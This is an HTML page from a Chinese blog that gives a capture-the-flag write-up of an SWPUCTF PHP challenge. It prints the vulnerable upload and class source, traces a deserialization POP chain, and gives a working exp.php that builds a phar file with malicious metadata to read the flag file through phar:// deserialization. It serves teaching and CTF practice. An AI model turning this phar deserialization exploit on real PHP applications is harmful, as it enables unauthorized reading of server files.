@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        实例深度理解phar与序列化 - Monitor&#39;s Blog
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> Never be afraid to try and fail. </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar">
+            <img src="/img/avatar.jpg">
+        </div>
+        <div class="name">
+            <i>monitor</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li>
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li>
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pop链"><span class="toc-text">pop链</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击流程"><span class="toc-text">攻击流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#END"><span class="toc-text">END</span></a></li></ol></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+        <div class="index-about-mobile">
+            <i> Never be afraid to try and fail. </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        实例深度理解phar与序列化
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2019-07-12 14:23:27</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#-[php,unserialize]" title="-[php,unserialize]">-[php,unserialize]</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content ">
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=564247897&auto=1&height=66"></iframe>
+
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>昨天看了一天的phar://与反序列化，觉得越发有趣，于是今天就找了一些实例来深入理解一下，顺便巩固一下昨天的知识。这里用的是SWPUCTF的一道题目。</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>前端页面，我就简陋的做了一下了，这里就简略的分析一下核心部分,先贴上源码：</p>
+<p><strong>file.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'D:/phpStudy/www/phar_Te/SWPU_SimplePHP'</span>);</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>] ? $_GET[<span class="string">'file'</span>] : <span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$show = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123;</span><br><span class="line">    $show-&gt;source = $file;</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'file doesn\'t exists.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>upload_file.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>;</span><br><span class="line">upload_file();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>function.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__);</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"base.php"</span>;</span><br><span class="line">header(<span class="string">"Content-type: text/html;charset=utf-8"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $_FILES; </span><br><span class="line">    $filename = md5($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>].$_SERVER[<span class="string">"REMOTE_ADDR"</span>]).<span class="string">".jpg"</span>;</span><br><span class="line">    <span class="comment">//mkdir("upload",0777);</span></span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="string">"upload/"</span> . $filename)) &#123;</span><br><span class="line">        unlink($filename);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],<span class="string">"upload/"</span> . $filename);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("上传成功!");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $_FILES;</span><br><span class="line">    <span class="keyword">if</span>(upload_file_check()) &#123;</span><br><span class="line">        upload_file_do();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $_FILES;</span><br><span class="line">    $allowed_types = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"jpeg"</span>,<span class="string">"jpg"</span>,<span class="string">"png"</span>);</span><br><span class="line">    $temp = explode(<span class="string">"."</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">    $extension = end($temp);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($extension)) &#123;</span><br><span class="line">        <span class="comment">//echo "&lt;h4&gt;请选择上传的文件:" . "&lt;h4/&gt;";</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($extension,$allowed_types)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;script type="text/javascript"&gt;alert("Invalid file!");&lt;/script&gt;'</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>class.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里有个<strong>file.php</strong>,存在文件包含漏洞，使用可以先读取一下页面的源码，看到<strong>file.php</strong>页面</p>
+<p><code>$show = new Show();
+if(file_exists($file))</code></p>
+<p>可以联想到可能是序列化，利用<strong>phar</strong>协议。接着这里有一个上传页面，只允许上图片，并且上传过后会对文件名进行修改，有一个md5加密，修改文件名，其他的没什么东西。来到<strong>class.php</strong>这个文件，审计一下源码。</p>
+<p>我们看到，<strong>class.php</strong>中 <strong>_show()</strong> 方法对f1ag进行了过滤，因此不能直接读取文件，接着看到 <strong>Test</strong> 类，在最后看到<code>$text = base64_encode(file_get_contents($value));</code> 这里有 <strong>file_get_contents()</strong> 函数可以利用，回溯一下，这个函数在 <strong>file_get()</strong> 方法中被调用，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>而这个方法在 <strong>get()</strong> 方法中会被调用，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p> <strong>get()</strong> 方法在  <strong>__get()</strong>  中调用，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>那么就需要我们去触发这个  <strong>__get()</strong>  魔术方法了。官方文档解释是   <strong>__get($name):  读取不可访问属性的值时,会被调用。</strong> </p>
+<p>可以看到，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>在show类中有一个  <strong>__toString()</strong>   的魔术方法，会读取  <strong>str[‘str’]-&gt;source</strong>  属性，可以将  <strong>Test</strong>  类赋值给 <strong>str[‘str’]</strong>   这样就可以触发   <strong>__get</strong>。</p>
+<p>那么目前的问题就是  <strong>__toString()</strong>   这个魔术方法如何被触发了，这个魔术方法，只有在类被当作字符串输出的时候，会被调用，看到  <strong>C1e4r</strong>  类中有一个析构方法，会输出字符串，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>那么就可以将 <strong>show</strong>类的对象赋值给<strong>C1e4r</strong>对象去触发，这样就可以完成一个攻击。</p>
+<h3 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h3><ol>
+<li><strong>C1e4r</strong>类中的  <strong>__destruct()</strong>   方法会  <strong>echo $this-&gt;test;</strong></li>
+<li>触发  <strong>__toString()</strong>  方法，将<strong>Test</strong>类的值去访问不属于它的<strong>source</strong>属性。</li>
+<li>触发  <strong>__get()</strong>  方法，成功利用<strong>file_get_contents()</strong> 读取文件。</li>
+</ol>
+<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>首先写exp生成一个phar文件：<strong>exp.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params=<span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"test.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$fun1 = <span class="keyword">new</span> C1e4r();</span><br><span class="line">$fun2 = <span class="keyword">new</span> Show();</span><br><span class="line">$fun3 = <span class="keyword">new</span> Test();</span><br><span class="line">$fun3-&gt;params[<span class="string">'source'</span>]=<span class="string">'D:/phpStudy/www/phar_Te/SWPU_SimplePHP/f1ag.php'</span>;</span><br><span class="line">$fun2-&gt;str=<span class="keyword">array</span>(<span class="string">'str'</span>=&gt;$fun3);</span><br><span class="line">$fun1-&gt;str=$fun2;</span><br><span class="line">$phar-&gt;setMetadata($fun1);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); </span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>本地访问，生成test.phar文件，改为test.jpg来到上传页面上传文件，<img src="/2019/07/12/phar-unserialize2/1.png" alt></p>
+<p>构造一下文件名 md5(文件名+::1), 访问，执行成功</p>
+<p><img src="/2019/07/12/phar-unserialize2/2.png" alt></p>
+<h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>满打满算，差不多是一天半的时间在学习这个，经过这么长时间，总算是基本掌握了漏洞的原理以及利用方法，对于php代码的认识也多了很多，get到文件上传的一种新的手段，总的来说，收获还是蛮大的。</p>
+<p><strong>参考链接：</strong>  1. <a href="https://xz.aliyun.com/t/3692#toc-11" target="_blank" rel="noopener">https://xz.aliyun.com/t/3692#toc-11</a></p>
+<p>​                 2. <a href="https://xz.aliyun.com/t/3656#toc-14" target="_blank" rel="noopener">https://xz.aliyun.com/t/3656#toc-14</a></p>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = ""
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
